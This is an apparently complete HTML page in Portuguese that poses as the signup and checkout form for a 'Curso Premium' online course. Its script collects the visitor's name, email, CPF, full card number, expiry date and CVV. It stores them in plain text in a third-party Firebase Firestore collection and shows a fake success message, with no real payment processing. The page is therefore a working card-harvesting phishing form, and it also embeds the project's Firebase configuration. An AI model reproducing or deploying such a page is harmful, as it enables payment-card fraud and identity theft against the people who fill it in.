<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üöÄ Curso Premium - Mude sua vida</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: #f9f9f9;
    }
    .container {
      max-width: 500px;
      margin: 60px auto;
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
    }
    h1 {
      font-size: 24px;
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    button {
      background-color: #28a745;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #218838;
    }
    .hidden {
      display: none;
    }
    .success {
      background: #d4edda;
      color: #155724;
      padding: 10px;
      border-radius: 5px;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>üéì Inscreva-se agora no Curso Premium!</h1>

    <!-- Etapa 1 -->
    <div id="step1">
      <input type="text" id="nome" placeholder="Seu nome completo" required />
      <input type="email" id="email" placeholder="Seu e-mail" required />
      <button onclick="mostrarPagamento()">Avan√ßar ‚û°Ô∏è</button>
    </div>

    <!-- Etapa 2 -->
    <div id="step2" class="hidden">
      <input type="text" id="cpf" placeholder="Seu CPF" required />
      <input type="text" id="cartao" placeholder="N√∫mero do cart√£o" required />
      <input type="text" id="validade" placeholder="Validade do cart√£o (MM/AA)" required />
      <input type="text" id="cvv" placeholder="CVV (C√≥digo de seguran√ßa)" required />
      <button onclick="finalizarCompra()">üí≥ Comprar agora</button>
    </div>

    <div id="mensagem" class="success">
      ‚úÖ Compra registrada com sucesso! Verifique seu email.
    </div>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyA5nKgYdMHQYFwWyxE5JYQWwEjKZ5S7mVo",
      authDomain: "testeapps-4440a.firebaseapp.com",
      projectId: "testeapps-4440a",
      storageBucket: "testeapps-4440a.appspot.com",
      messagingSenderId: "609939982769",
      appId: "1:609939982769:web:e4fbd7f7df1f4db8390e92"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function mostrarPagamento() {
      const nome = document.getElementById('nome').value.trim();
      const email = document.getElementById('email').value.trim();

      if (nome === "" || email === "") {
        alert("Preencha nome e e-mail para continuar.");
        return;
      }

      // Guarda os dados temporariamente
      localStorage.setItem("temp_nome", nome);
      localStorage.setItem("temp_email", email);

      document.getElementById('step1').classList.add('hidden');
      document.getElementById('step2').classList.remove('hidden');
    }

    function finalizarCompra() {
      const cpf = document.getElementById('cpf').value;
      const cartao = document.getElementById('cartao').value;
      const validade = document.getElementById('validade').value;
      const cvv = document.getElementById('cvv').value;

      const nome = localStorage.getItem("temp_nome");
      const email = localStorage.getItem("temp_email");

      if (!cpf || !cartao || !validade || !cvv) {
        alert("Preencha todos os campos de pagamento.");
        return;
      }

      db.collection("compras").add({
        nome: nome,
        email: email,
        cpf: cpf,
        cartao: cartao,
        validade: validade,
        cvv: cvv,
        produto: "Curso Premium Online",
        preco: "70.00",
        data: new Date().toISOString()
      })
      .then(() => {
        document.getElementById('mensagem').style.display = 'block';
        document.getElementById('step2').reset?.();
      })
      .catch((error) => {
        alert("Erro ao registrar a compra: " + error);
      });
    }
  </script>
</body>
</html>
